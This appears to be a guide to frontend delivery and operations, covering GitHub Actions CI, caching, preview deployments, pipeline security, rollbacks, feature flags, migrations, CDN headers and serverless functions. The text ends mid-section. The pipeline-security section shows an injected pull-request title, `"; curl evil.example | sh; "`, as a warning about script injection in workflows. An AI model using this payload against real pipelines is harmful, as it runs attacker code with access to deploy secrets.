# Delivery and Operations: Guide

## Toolkit

### DevTools and tooling

Operations work happens in four places: the pipeline, the platform, the observability stack, and the browser.

- **GitHub Actions**: workflows live in `.github/workflows/*.yml`. The `gh` CLI saves a lot of clicking: `gh run list`, `gh run view --log-failed`, `gh run rerun --failed`, and `gh workflow run`. Run `actionlint` locally or in CI to catch YAML and expression mistakes before pushing.
- **Platform CLIs**: `vercel` (`vercel deploy`, `vercel promote`, `vercel rollback`, `vercel logs`), `wrangler` for Cloudflare (`wrangler deploy`, `wrangler versions upload`, `wrangler versions deploy`, `wrangler rollback`, `wrangler tail`), and `netlify` (`netlify deploy`, `netlify deploy --prod`). Learn the rollback command for your platform before you need it.
- **curl for headers**: `curl -sI https://example.com/` shows `Cache-Control`, `Age`, and the CDN's cache status header (`CF-Cache-Status`, `X-Vercel-Cache`). `curl -w "%{time_namelookup} %{time_connect} %{time_appconnect} %{time_starttransfer}\n" -o /dev/null -s <url>` breaks a request into DNS, TCP, TLS, and time to first byte.
- **dig and openssl**: `dig +short example.com`, `dig CNAME www.example.com`, and `openssl s_client -connect example.com:443 -servername example.com` for certificate chain and expiry.
- **Docker**: `docker build`, `docker run -p 3000:3000`, `docker history <image>` to see layer sizes, and `docker scout` or `trivy` for vulnerability scans.
- **Browser DevTools**: the Network panel (Size column shows cache hits, the Timing tab shows TTFB and `Server-Timing`), Application > Service workers and Storage, and the Sources panel with source maps. Local overrides and request blocking let you simulate failures.
- **Error tracking and RUM**: Sentry (or similar) for errors, releases, and replay; the `web-vitals` library for field metrics; the Chrome UX Report for public field data.
- **Synthetic checks**: Playwright for scripted flows, Lighthouse CI for lab performance budgets, and a scheduler such as Checkly or your CI's cron trigger.
- **Database**: `psql` with `EXPLAIN (ANALYZE, BUFFERS)`, and your ORM's query logging.

### Testing and verifying your work

For delivery work, "done" means you watched the mechanism work, including the failure path.

- **Pipeline**: open a PR with a deliberate lint error, type error, and failing test, and confirm each blocks the merge. Check that required status checks are configured in the branch ruleset, since a failing check that is not required blocks nothing.
- **Caching in CI**: compare a cold run with a warm run. Look for "cache hit" in the logs and for task-runner output such as Turborepo's `FULL TURBO`.
- **Preview deployments**: every PR gets a URL, posted on the PR, built with preview (not production) environment variables and data.
- **Rollback**: do one on purpose. Time it. Confirm what did and did not roll back (code yes; database, environment variables, and third-party config no).
- **Cache headers**: `curl -sI` the HTML document and a hashed asset. HTML should revalidate; hashed assets should be `immutable` with a long `max-age`. Request the asset twice and watch the cache status go from miss to hit.
- **Version skew**: deploy while a tab with the old version is open, then navigate. Lazy-loaded routes must still work or recover cleanly.
- **Source maps**: throw a test error in production and check the stack trace in your error tracker shows original file names and lines, tagged with the right release.
- **RUM**: confirm metrics arrive segmented by route, device type, and release, and that you read the 75th percentile rather than the mean.
- **Alerts**: trigger each alert once (a test error burst, a failing synthetic check) and confirm it reaches a human with a link to a runbook.
- **Containers**: build, run locally, hit the health endpoint, send `SIGTERM`, and confirm a clean shutdown within the grace period.

### Tricks and gotchas

- Pin third-party actions to a full commit SHA, set `permissions:` to the minimum at the top of every workflow, and never use `pull_request_target` to run code from a fork with secrets available.
- Add `concurrency` with `cancel-in-progress` for PR workflows so superseded pushes stop burning minutes; do not cancel in-progress production deploys.
- Set `timeout-minutes` on every job. The default is six hours.
- GitHub cache entries are scoped by branch: a PR can read caches from its base branch, but `main` cannot read caches created by PRs. Warm caches on `main`.
- HTML is the pointer to your assets. Cache it for a year by mistake and no deploy reaches users until you purge.
- Never delete old hashed assets at deploy time. Clients running the previous version will request them for hours or days.
- A rollback restores code, not data. Make database changes backward compatible (expand, migrate, contract) so the previous version still runs.
- Environment variables read at build time are baked in. Changing them in the dashboard does nothing until you rebuild.
- Do not serve public `.map` files unless you intend to; upload them to your error tracker and delete them from the deploy output.
- Averages hide the users who are suffering. Use percentiles (p75 for Web Vitals, p95 or p99 for latency).
- Sample high-volume telemetry, but keep 100% of errors.
- An alert nobody acts on is noise. Delete it or fix it; do not mute it.
- Set a spend limit or budget alert on any usage-billed platform before launch, not after the first surprise invoice.
- In an incident, write down what you do with timestamps as you go. You will not remember at the postmortem.

### Official references

- [GitHub Actions documentation](https://docs.github.com/en/actions) — workflows, runners, caching, environments, and security hardening.
- [GitHub Docs: Workflow syntax](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax) — every key you can write in a workflow file.
- [Vercel documentation](https://vercel.com/docs) — deployments, functions, CDN cache, skew protection, rolling releases.
- [Cloudflare Workers documentation](https://developers.cloudflare.com/workers/) — runtime, limits, static assets, versions and gradual deployments.
- [Netlify documentation](https://docs.netlify.com/) — deploys, deploy previews, functions, and edge functions.
- [Docker docs: Building best practices](https://docs.docker.com/build/building/best-practices/) — multi-stage builds, layer caching, and image hygiene.
- [MDN: HTTP caching](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Caching) — how browser and shared caches decide what to reuse.
- [Sentry docs: JavaScript](https://docs.sentry.io/platforms/javascript/) — SDK setup, source maps, releases, tracing, and replay.
- [OpenTelemetry docs: JavaScript](https://opentelemetry.io/docs/languages/js/) — vendor-neutral traces, metrics, and logs.
- [web.dev: Best practices for measuring Web Vitals in the field](https://web.dev/articles/vitals-field-measurement-best-practices) — how to collect and report RUM data.
- [Google SRE Book](https://sre.google/sre-book/table-of-contents/) and [SRE Workbook](https://sre.google/workbook/table-of-contents/) — SLOs, alerting, incident response, postmortems, on-call.
- [PostgreSQL docs: Using EXPLAIN](https://www.postgresql.org/docs/current/using-explain.html) — reading query plans.

## Skills

### CI pipeline

Continuous integration runs the same checks on every pull request so that problems are found before merge, by a machine, in a clean environment. For a frontend the baseline is lint, type-check, unit tests, and a production build; end-to-end tests usually run as a separate job.

```yaml
# .github/workflows/ci.yml
name: CI
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  verify:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: 24
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck
      - run: npm test
      - run: npm run build
```

Details that matter. Use `npm ci` (or `pnpm install --frozen-lockfile`), which installs exactly the lockfile and fails if it is out of date. Pin the Node version to what production runs. Run the real production build, because it catches errors that dev mode and the type-checker miss. Set `permissions` to the minimum; the token only needs to read code here. Set a timeout.

A pipeline only protects `main` if it is required. In the repository's rulesets or branch protection, require the status checks to pass and require branches to be up to date (or use a merge queue). Otherwise a red check is advice.

Keep CI and local commands identical: CI should call `npm run lint`, not a different invocation that developers cannot reproduce. Common mistakes are checks that only run on `main` (too late), flaky tests that people learn to re-run, secrets exposed to workflows triggered from forks, and letting the pipeline grow until nobody waits for it.

**Try it:** Add this workflow to a repository, open a PR containing a type error, and confirm the check fails. Then make the check required in the branch ruleset and confirm the merge button is blocked.

**Resources**
- [GitHub Docs: Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax)
- [actions/setup-node README](https://github.com/actions/setup-node)
- [GitHub Docs: About rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets)

### Fast pipelines

A pipeline people wait for must be fast, or they batch changes and stop trusting it. Aim for PR feedback in under ten minutes, and measure before optimising: the job summary shows the duration of every step.

**Caching.** Cache what is expensive and deterministic. `actions/setup-node` with `cache: npm` caches the package manager's download cache keyed on the lockfile. Cache build tool state too (`.next/cache`, Vite and ESLint caches, Playwright browsers) with `actions/cache`:

```yaml
- uses: actions/cache@v6
  with:
    path: .next/cache
    key: next-${{ runner.os }}-${{ hashFiles('package-lock.json') }}-${{ hashFiles('src/**') }}
    restore-keys: |
      next-${{ runner.os }}-${{ hashFiles('package-lock.json') }}-
```

`restore-keys` gives a partial match when the exact key misses, which is what you want for incremental caches. Know the scoping rule: a workflow can restore caches from its own branch and the default branch, not from sibling branches, and repositories have a total cache size limit with least-recently-used eviction.

**Parallelism.** Split independent work into separate jobs (lint, types, unit, e2e) so wall-clock time is the slowest job, not the sum. Shard long suites across runners with a matrix:

```yaml
strategy:
  fail-fast: false
  matrix:
    shard: [1, 2, 3, 4]
steps:
  - run: npx playwright test --shard=${{ matrix.shard }}/4
```

**Affected only.** In a monorepo, run tasks only for what changed and its dependents (`turbo run test --affected`, `nx affected -t test`), with remote task caching so unchanged work is replayed. This needs git history: use `fetch-depth: 0` or the comparison falls back to "everything changed". For single-package repos, `paths` filters skip workflows for docs-only changes.

Also: cancel superseded runs with `concurrency`, order cheap checks first, and avoid reinstalling dependencies in every job when an artifact or cache can be shared. The trap is correctness: a cache keyed too loosely restores stale output and gives a green build that is wrong.

**Try it:** Take a workflow's last run and note each step's duration. Add dependency caching and one parallel split, push twice, and compare cold and warm durations.

**Resources**
- [GitHub Docs: Dependency caching reference](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching)
- [Playwright docs: Sharding](https://playwright.dev/docs/test-sharding)
- [Turborepo docs: Constructing CI](https://turborepo.dev/docs/crafting-your-repository/constructing-ci)

### Preview deployments

A preview deployment is a complete, isolated build of a branch at its own URL, created automatically for every pull request and updated on every push. It changes review: designers, product managers, and QA look at the running change instead of reading a diff, and automated checks (end-to-end tests, Lighthouse, accessibility scans, visual regression) run against something real.

Platforms connected to your Git provider do this without configuration. Vercel creates a preview for every push to a non-production branch and comments the URL on the PR. Netlify's Deploy Previews use URLs of the form `deploy-preview-42--yoursite.netlify.app`. Cloudflare Workers produce preview URLs per uploaded version. Deployments are immutable: each commit has its own URL, plus a stable alias per branch.

What takes thought is everything around the frontend build:

- **Data and APIs.** Previews should use preview-scoped environment variables pointing at a staging API or a per-branch database. Pointing previews at production data is the classic mistake.
- **Auth.** OAuth providers need known redirect URLs, and preview hostnames are dynamic. Use a wildcard where the provider allows it, or a fixed proxy callback.
- **Access.** Preview URLs are guessable and may show unreleased work. Use the platform's deployment protection (on Vercel, Standard Protection restricts every non-production URL, and automated tests get through with a bypass secret) and send `X-Robots-Tag: noindex`.
- **CORS and cookies.** Backends must allow the preview origins, and cookies scoped to the production domain will not be sent.
- **Testing against the URL.** Wait for the deployment to be ready, then run Playwright with `baseURL` set to it. GitHub's `deployment_status` event is the usual trigger.
- **Cost and cleanup.** Every push builds. Skip builds for unaffected apps in a monorepo and let old previews expire.

A preview is not production: different data, cold caches, and no real traffic. It reduces risk before merge; it does not replace monitoring after release.

**Try it:** Connect a repository to Vercel, Netlify, or Cloudflare and open a PR. Find the preview URL on the PR, check which environment variables it was built with, and verify whether a logged-out visitor can open it.

**Resources**
- [Vercel docs: Environments](https://vercel.com/docs/deployments/environments)
- [Netlify docs: Deploy Previews](https://docs.netlify.com/deploy/deploy-types/deploy-previews/)
- [Cloudflare Workers docs: Preview URLs](https://developers.cloudflare.com/workers/configuration/previews/)

### Pipeline security

Your CI pipeline can read your source, holds deploy credentials, and publishes what users run. That makes it a target: compromising one popular action or one workflow gives an attacker your secrets and your production. Four controls cover most of the risk.

**Pin third-party actions to a full commit SHA.** A tag such as `@v4` is mutable; whoever controls the action's repository (or steals its maintainer's token) can move it to malicious code, and your next run executes it with your secrets. A full-length SHA is immutable. Keep the version in a comment and let Dependabot propose updates. GitHub can enforce SHA pinning with a repository or organisation policy.

**Least-privilege tokens.** Every job gets a `GITHUB_TOKEN`. Set the workflow default to nothing and grant each job only what it needs.

**OIDC instead of long-lived secrets.** A stored cloud key works from anywhere until someone rotates it. With OpenID Connect, the job requests a short-lived signed token from GitHub describing itself (repository, branch, environment); the cloud provider checks those claims against a trust policy you configured and returns credentials that expire when the job ends. There is nothing to leak or rotate. The same mechanism powers npm trusted publishing.

**Protected environments.** Put deploy credentials in an environment (`production`) rather than repository secrets. The environment can require reviewers and restrict which branches may deploy, so a workflow on a feature branch cannot reach them.

```yaml
permissions: {}

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      contents: read
      id-token: write   # allows the job to request an OIDC token
    steps:
      # Replace the placeholder with the release's 40-character commit SHA
      - uses: actions/checkout@<full-commit-sha> # v7
      - name: Greet the PR safely
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Deploying: $TITLE"
```

The `env` indirection in the last step matters. Writing `run: echo "${{ github.event.pull_request.title }}"` pastes attacker-controlled text into the shell script before it runs, so a PR titled `"; curl evil.example | sh; "` executes. Passing it through an environment variable keeps it as data.

Other rules: never run untrusted fork code with secrets available, which is what `pull_request_target` combined with checking out the PR head does; require CODEOWNERS review for `.github/workflows/`; do not print secrets or pass them as command-line arguments; and treat dependency installation as code execution (install scripts run in CI), so review lockfile changes and use your package manager's controls on install scripts.

**Try it:** Open a workflow in one of your repositories. For each `uses:` line, check whether it is pinned to a SHA; check for a top-level `permissions` block; and search `run:` steps for `${{ github.event` expressions. Fix what you find.

**Resources**
- [GitHub Docs: Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use)
- [GitHub Docs: OpenID Connect](https://docs.github.com/en/actions/concepts/security/openid-connect)
- [GitHub Docs: Deployments and environments](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments)

### Continuous deployment

Continuous deployment means every change merged to `main` goes to production automatically, with no manual gate. (Continuous *delivery* means `main` is always deployable and releasing is a button.) Small, frequent deploys are safer than large, rare ones: each contains little, so failures are easy to locate and cheap to reverse. DORA's research ties deployment frequency and short lead time to better stability, not worse.

"With confidence" is the hard part. You need to be able to answer yes to these:

1. **Is `main` always green?** Required checks, plus a merge queue once merges are frequent.
2. **Do the tests cover the flows that matter?** A small set of end-to-end tests over revenue-critical paths is worth more than broad shallow coverage.
3. **Is the deploy itself safe?** Immutable builds, atomic switch-over, protection against version skew, and backward-compatible database and API changes.
4. **Will you know within minutes if it is bad?** Post-deploy smoke tests, error-rate and Web Vitals monitoring tagged by release, alerts.
5. **Can you undo it in a minute?** A practised rollback and feature flags.
6. **Is unfinished work hidden?** Trunk-based development with flags, rather than long-lived branches.

A minimal deploy job gated on CI:

```yaml
deploy:
  needs: verify
  if: github.ref == 'refs/heads/main'
  runs-on: ubuntu-latest
  environment: production
  concurrency:
    group: deploy-production
    cancel-in-progress: false
  steps:
    - uses: actions/checkout@v7
    - run: npx wrangler deploy
      env:
        CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
```

The `environment` scopes secrets to the deploy job and can require approval if you want delivery rather than deployment. The `concurrency` group stops two deploys racing, and deliberately does not cancel one in progress.

Mistakes: deploying on a schedule or in large batches "to be safe" (that increases risk per deploy), coupling a frontend deploy to a database migration that cannot be reversed, and having no signal after deploy other than user complaints.

**Try it:** Write down what happens between merge and production for a project you work on, and how long each step takes. Mark each manual step and decide what evidence would let you automate it.

**Resources**
- [DORA: Continuous delivery](https://dora.dev/capabilities/continuous-delivery/)
- [GitHub Docs: Deployments and environments](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments)
- [Martin Fowler: Continuous Delivery](https://martinfowler.com/bliki/ContinuousDelivery.html)

### Release strategies

A release strategy controls how traffic moves from the old version to the new one. The point is to limit how many users a bad release reaches and how long it takes to undo.

- **All at once (atomic switch).** Build the new version alongside the old, then repoint the domain. This is the default on frontend platforms. Simple and fast; a bad release hits everyone until you roll back.
- **Blue-green.** Two full production environments. Blue serves traffic while green receives the new version and is verified; then the router switches. Rollback is switching back. Costs: double capacity, and both must work against the same database.
- **Canary.** Send a small share of real traffic (1 to 5%) to the new version, compare its error rate, latency, and Web Vitals with the baseline, then widen or abort. This is the only strategy that tests with real users and real data before full exposure.
- **Percentage rollout.** A canary in stages (5%, 25%, 50%, 100%), each held long enough to see a signal, ideally advanced automatically when metrics stay healthy.

Platforms now offer this for frontends: Vercel's Rolling Releases assign visitors to buckets via a cookie and shift configured fractions to the new deployment; Cloudflare Workers gradual deployments split traffic between two versions by percentage.

Frontend specifics that people miss:

- **Stickiness.** A user must stay on one version across requests, or HTML from version B will request chunks from version A. Assignment needs a cookie or stable hash, and asset requests must be pinned to the version that served the page (skew protection).
- **Comparable metrics.** Tag errors and RUM with the release ID, otherwise you cannot compare canary with baseline.
- **Enough traffic.** 5% of a small site is too few sessions to detect anything; hold stages longer or use flags aimed at internal users first.
- **Shared state.** Both versions run against the same APIs and database for the duration, so changes must be compatible both ways.

Feature flags are the complementary tool: release strategies roll out a *build*; flags roll out a *feature* within a build, by user or segment.

**Try it:** For your app, decide what a 5% canary would need: how users stay on one version, which two metrics you would compare, and how long 5% must run to gather 1,000 sessions at your traffic.

**Resources**
- [Martin Fowler: Canary Release](https://martinfowler.com/bliki/CanaryRelease.html)
- [Vercel docs: Rolling Releases](https://vercel.com/docs/rolling-releases)
- [Cloudflare Workers docs: Gradual deployments](https://developers.cloudflare.com/workers/configuration/versions-and-deployments/gradual-deployments/)

### Rollbacks

When production is broken, the first goal is to stop the harm, and the fastest way is usually to go back to the last version that worked. Understanding and fixing come afterwards. A rollback should take about a minute and should have been practised.

There are three ways back, in decreasing speed:

1. **Turn off a flag.** If the change is behind a feature flag, disabling it takes seconds and needs no deploy. This is why you decouple *deploy* (code is in production) from *release* (users see it): code can ship dark, be enabled for staff, then for 5%, and be switched off instantly.
2. **Repoint to the previous deployment.** Platforms keep old deployments intact. `vercel rollback`, Vercel's Instant Rollback, `wrangler rollback`, or Netlify's "Publish deploy" on an older deploy switch traffic without rebuilding.
3. **Revert and redeploy.** `git revert <sha>` and let the pipeline run. Slowest, because you wait for CI and build, but it also fixes `main`.

Do the first or second to stop the bleeding, then the third so the next deploy does not reintroduce the bug. On Vercel, a rollback turns off automatic promotion of new production deployments until you promote one again, precisely to prevent that.

What a rollback does not undo:

- **Data.** Rows written in the new format, migrations that dropped a column. See Database migrations for how to keep schema changes reversible.
- **Configuration.** Environment variable changes, DNS, third-party settings, feature flag state.
- **Clients.** Tabs already running the bad JavaScript, service worker caches, CDN-cached HTML. You may need a purge and a way to make clients reload.
- **Side effects.** Emails sent, payments taken.

Flags are not free; the next entry covers how to manage them.

**Try it:** Roll back a deployed project to the previous deployment using the platform CLI or dashboard and time it. Then list three things in your system a rollback would not restore.

**Resources**
- [Vercel docs: Instant Rollback](https://vercel.com/docs/instant-rollback)
- [Cloudflare Workers docs: Gradual deployments](https://developers.cloudflare.com/workers/configuration/versions-and-deployments/gradual-deployments/)

### Feature flag lifecycle

A feature flag is a runtime switch around a code path. Each one doubles the number of states that code can be in, and a flag that is never removed becomes permanent, untested complexity. There are well-known outages caused by an old flag being reused or a dead code path being re-enabled. Managing flags as things with a lifecycle is what keeps them an asset.

**Classify at creation**, because the type sets the lifespan. Release toggles hide unfinished work and should live days to weeks. Experiment flags live for the length of the experiment. Ops flags (kill switches) and permission flags (plan entitlements) are long-lived by design and should be labelled as such.

**Every flag has an owner and an expiry.** Record them where the flag is defined, and make staleness visible:

```ts
export const flags = {
  newCheckout: {
    type: 'release',
    owner: 'team-payments',
    expires: '2026-12-01',
    default: false,
  },
} as const;
```

A CI check that fails (or opens a ticket) when a release flag passes its expiry turns cleanup from a good intention into a task. Most flag services also report flags that have served one value to everyone for weeks.

**Cleanup is part of the feature.** The work is done when the flag is at 100%, the losing branch is deleted, the flag's tests are collapsed, and the flag is archived in the service. Create the removal ticket when you create the flag. Remove code first, then the flag definition, so a still-deployed old build does not evaluate a missing flag to an unexpected default.

**Keep server and client evaluations consistent.** If the server renders with the flag on and the browser evaluates it as off, you get a hydration mismatch, a flash of the wrong UI, or a user who sees a button whose API rejects them. Rules:

- Evaluate once per request on the server, with a stable targeting key (user or anonymous ID in a cookie), and pass the resulting values to the client in the HTML payload. The client uses those values and does not re-evaluate during hydration.
- Percentage rollouts must hash a stable key so a user stays in the same bucket across requests, devices where possible, and services.
- The backend must check the same flag for the API the UI calls; the UI flag is not access control.
- Decide what happens when the flag service is unreachable: safe defaults compiled into the code, and a cached last-known configuration.
- Flag values are part of the cache key. A CDN-cached page rendered for one variant must not be served to the other.

Client-side flag payloads are public: do not put unreleased product names in flag keys you ship to browsers. Test both states of a flag while it exists, and keep the number of simultaneously active release flags small, since combinations multiply. Tag errors and RUM with active flags so you can tell which variant is failing.

**Try it:** List the flags in a codebase you work on. For each, find its owner, its age, and the percentage it serves. Pick one that has been at 100% for over a month and remove it, including the dead branch and its tests.

**Resources**
- [Martin Fowler: Feature Toggles](https://martinfowler.com/articles/feature-toggles.html)
- [OpenFeature docs: Evaluation context](https://openfeature.dev/docs/reference/concepts/evaluation-context)

### Database migrations

A frontend engineer who owns a deploy needs to know why "just roll back" sometimes is not possible: the database changed underneath the code. Code can be swapped in a second; data cannot. During any deploy (and for the whole of a canary or rolling release) old and new code run against the same database, and after a rollback the old code runs against the *new* schema. A schema change is therefore safe only if both versions of the code work with it.

The technique is **expand, migrate, contract** (also called parallel change). A breaking change is split into steps that are each backward compatible, shipped as separate deploys. Renaming `users.name` to `users.full_name`:

```sql
-- 1. Expand: add the new column. Old code ignores it.
ALTER TABLE users ADD COLUMN full_name text;

-- 2. Deploy code that writes both columns and still reads the old one.

-- 3. Migrate: backfill existing rows, in batches to avoid long locks.
UPDATE users SET full_name = name
WHERE full_name IS NULL AND id BETWEEN 1 AND 10000;

-- 4. Deploy code that reads the new column (still writing both).
-- 5. Deploy code that stops writing the old column.

-- 6. Contract: only when no running or rollback-target version uses it.
ALTER TABLE users DROP COLUMN name;
```

At every step you can roll the code back one version and it still works. A single `ALTER TABLE ... RENAME COLUMN` shipped with the code that uses the new name fails both ways: old instances break the moment the migration runs, and a rollback puts old code on a schema it cannot read.

Rules that follow:

- **Additive changes are safe**: new nullable columns, new tables, new indexes. **Destructive changes are deferred**: drops, renames, type changes, and adding `NOT NULL` to existing data happen in a later release, after the old code is gone.
- **Migrate before the code that needs it; remove after the code that used it.** Run migrations as their own pipeline step, not at application startup on every instance.
- **Dropping is the one-way door.** Take a backup, and wait until the previous version is no longer a rollback target.
- **Watch locks on large tables.** Some schema changes block writes while they run; build indexes without blocking (`CREATE INDEX CONCURRENTLY` in PostgreSQL) and backfill in batches.
- **Migrations are code**: versioned files in the repository, reviewed, run by a tool (Prisma Migrate, Drizzle, Flyway, and others), and tested against a copy of production-shaped data.

The same thinking applies to anything persisted outside the server: API response shapes consumed by old tabs, `localStorage` and IndexedDB schemas, queued jobs, and cached entries all outlive a deploy and need the same compatibility window.

**Try it:** Take a change you might make (split `address` into `street` and `city`, or change a status string into an enum). Write the sequence of deploys and migrations so that after each one, rolling the code back one version still works. Mark the step that cannot be undone.

**Resources**
- [Martin Fowler: Parallel Change](https://martinfowler.com/bliki/ParallelChange.html)
- [Martin Fowler and Pramod Sadalage: Evolutionary Database Design](https://martinfowler.com/articles/evodb.html)
- [PostgreSQL docs: CREATE INDEX (building indexes concurrently)](https://www.postgresql.org/docs/current/sql-createindex.html)

### Versioning and changelogs

Applications are identified by a commit or deployment ID. Packages that other code depends on need versions that carry meaning, and a changelog that tells consumers what to do. Semantic versioning is the contract: `MAJOR.MINOR.PATCH`, where major means breaking, minor means backward-compatible features, and patch means backward-compatible fixes. Consumers' ranges (`^2.3.0`) rely on you honouring it.

Doing this by hand fails: people forget to bump, bump wrongly, or write the changelog from memory. Automate it with one of two models.

**Changesets** (intent files, good for monorepos). Each PR that affects consumers adds a small file:

```md
---
"@acme/ui": minor
"@acme/tokens": patch
---

Add a `size` prop to Button. Fix the focus ring colour token in dark mode.
```

`npx @changesets/cli` creates it interactively. On `main`, the Changesets GitHub Action keeps a "Version Packages" PR open that applies the bumps, updates dependent packages, and writes `CHANGELOG.md`. Merging that PR publishes. The human decides the bump and writes the message at the time they understand the change.

**Conventional Commits** (derive from commit messages). Tools such as release-please and semantic-release read `feat:`, `fix:`, and `feat!:` or `BREAKING CHANGE:` to compute the version and changelog. Less ceremony per PR, but it depends on disciplined commit messages, and commit messages are written for developers, not consumers.

Publishing safely: publish from CI, never from a laptop. Use npm trusted publishing, which authenticates the workflow by OIDC so there is no long-lived token to leak, and which attaches provenance attestations automatically for public packages. It requires `id-token: write` permission and a recent npm CLI. Verify the package contents with `npm pack --dry-run` and `publint`.

Also know: pre-release versions and dist-tags (`2.0.0-beta.1` on `next`) for testing majors; `npm deprecate` instead of unpublishing; and that a changelog entry should say what changed and what the consumer must do, not "refactored internals".

**Try it:** In a small package repo, run `npx @changesets/cli init`, add a changeset for a pretend feature, run `npx @changesets/cli version`, and read the generated `CHANGELOG.md` and version bump.

**Resources**
- [Changesets repository and docs](https://github.com/changesets/changesets)
- [npm docs: Trusted publishing for npm packages](https://docs.npmjs.com/trusted-publishers)
- [Semantic Versioning 2.0.0](https://semver.org/)

### Hosting platforms

Vercel, Netlify, and Cloudflare let you connect a repository and get production hosting. That convenience is a stack of infrastructure you would otherwise run yourself, and you should be able to name each layer, because debugging and cost both depend on it.

What the platform does for you:

- **Build**: clones the repo, installs dependencies, runs your framework's build in a container, with caching.
- **Framework adaptation**: maps build output to infrastructure. Static files go to object storage behind a CDN; server-rendered routes, API routes, and middleware become functions; image optimisation becomes a service.
- **Immutable deployments**: every build gets a unique URL; production is an alias pointing to one. That is why previews and instant rollbacks are possible.
- **Global CDN, TLS, and DNS**: certificates issued and renewed automatically, HTTP/2 and HTTP/3, compression, cache.
- **Compute**: functions that scale with traffic, including to zero.
- **Extras**: environment variables and secrets, logs, analytics, firewall and DDoS protection, storage products.

The platforms differ mostly in compute. Vercel runs Node.js functions in regions (its Fluid compute model lets one instance serve concurrent requests) and is the reference host for Next.js. Cloudflare runs your code in V8 isolates in every edge location (Workers, which also serve static assets; Cloudflare directs new projects there rather than to Pages), with a web-standard runtime and a Node.js compatibility layer. Netlify offers Node-based functions and Deno-based edge functions.

What you still own: your caching headers, database placement relative to compute (a function in Virginia calling a database in Frankfurt is slow whatever the CDN does), secrets, cost, and behaviour during a platform incident. Understand lock-in too: static output is portable everywhere; framework features that rely on platform primitives (ISR, image optimisation, edge middleware) are less so. Next.js now documents an adapter API and self-hosting as a Node server or container, which is your exit route.

**Try it:** Deploy the same small app to two of the three platforms. For each, find: the build log, where the HTML is served from (static or function), the response headers on the document, and how you would roll back.

**Resources**
- [Vercel docs: Deployments overview](https://vercel.com/docs/deployments)
- [Cloudflare Workers docs: Static assets](https://developers.cloudflare.com/workers/static-assets/)
- [Next.js docs: Deploying](https://nextjs.org/docs/app/getting-started/deploying)

### CDN configuration

A CDN is a network of caches near your users. Configuring it is deciding, per kind of response, who may cache it, for how long, under which key, and how it is invalidated.

The standard frontend policy:

```http
# HTML documents: always check with the origin
Cache-Control: no-cache

# Fingerprinted assets (app.3f9a1c.js): cache forever
Cache-Control: public, max-age=31536000, immutable

# Cacheable API or server-rendered page: short at the edge, never in the browser
Cache-Control: public, max-age=0, s-maxage=60, stale-while-revalidate=300
```

`max-age` applies to every cache including the browser; `s-maxage` only to shared caches. `no-cache` means "store, but revalidate before use", not "do not store" (that is `no-store`). `stale-while-revalidate` lets the CDN serve the stale copy instantly while refreshing in the background. `CDN-Cache-Control` is a separate header for the CDN alone, which avoids juggling browser and edge lifetimes in one header.

**Cache keys.** By default the key is the URL. `Vary` adds request headers to it; `Vary: Cookie` or `Vary: User-Agent` effectively disables caching because nearly every request differs. Unneeded query parameters (tracking tags) fragment the cache.

**Personalised content.** Never let a shared cache store a response that depends on a session. Mark those `private` or `no-store`. Serving one user's page to another from the CDN is among the worst incidents a frontend can cause.

**Invalidation.** Fingerprinted assets need none: a new build has new URLs. For HTML and API responses use short TTLs, purge by URL, or purge by tag (surrogate keys) when content changes. A purge is not instant everywhere and does not reach browser caches, which is why browser TTLs for HTML stay at zero.

**Platform defaults.** Cloudflare caches static file extensions by default but not HTML or JSON; you add a cache rule to change that. Framework hosts cache static output automatically and respect your headers for function responses.

**Edge logic.** Redirects, rewrites, header changes, geolocation, A/B bucketing, and auth checks can run at the edge before the cache. Keep it small and fast, because it runs on every request, and remember that logic which varies the response must also vary the cache key.

Verify with `curl -sI`: look at `Cache-Control`, `Age`, and the cache status header.

**Try it:** Run `curl -sI` on your site's HTML document and on one hashed JS file. Check each against the policy above, then request the JS file twice and watch the cache status change from a miss to a hit.

**Resources**
- [MDN: Cache-Control header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cache-Control)
- [Cloudflare docs: Default cache behavior](https://developers.cloudflare.com/cache/concepts/default-cache-behavior/)
- [Jake Archibald: Caching best practices and max-age gotchas](https://jakearchibald.com/2016/caching-best-practices/)

### Serverless and edge functions

Serverless functions run your code on demand without you managing servers: the platform starts instances as requests arrive and removes them when idle. There are two families, and they behave differently.

**Regional functions** (AWS Lambda style, Vercel Functions, Netlify Functions) run a full Node.js runtime in a container or microVM in one or a few regions. You get the whole Node API and npm ecosystem, generous memory, and long timeouts. The cost is the **cold start**: the first request to a new instance waits for the runtime to boot and your code to load, typically hundreds of milliseconds, more with a large bundle. Platforms reduce it with pre-warmed instances, bytecode caching, and in-instance concurrency (Vercel's Fluid compute serves multiple requests from one instance, which also changes billing to active CPU time).

**Edge functions** (Cloudflare Workers, Netlify Edge Functions, Deno Deploy) run in V8 isolates in many locations close to users. Isolates start in milliseconds, so cold starts are negligible. The cost is a constrained runtime: web-standard APIs (`fetch`, `Request`, streams, Web Crypto) rather than full Node, tight memory (128 MB per isolate on Workers), CPU-time limits, and no arbitrary native modules. Cloudflare's `nodejs_compat` covers much of Node's API surface, but not all packages work.

What to design for:

- **Statelessness.** Memory does not persist reliably between requests and instances are not shared. Put state in a database or cache.
- **Database connections.** Many short-lived instances can exhaust a connection pool. Use a pooler or an HTTP-based driver.
- **Data locality.** Running at the edge is slower, not faster, if every request then makes three round trips to a database in one region. Put compute near data, or cache at the edge.
